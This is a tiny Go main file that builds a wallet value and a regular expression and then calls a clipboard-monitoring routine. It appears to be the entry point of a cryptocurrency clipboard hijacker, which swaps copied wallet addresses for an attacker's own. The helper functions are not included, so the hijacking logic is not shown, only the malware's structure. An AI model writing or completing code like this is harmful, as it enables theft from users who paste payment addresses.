package main

func main() {
	wallet := BuildWallet()
	regex := BuildRegex()
	MonitorClipboard(wallet, regex)
}
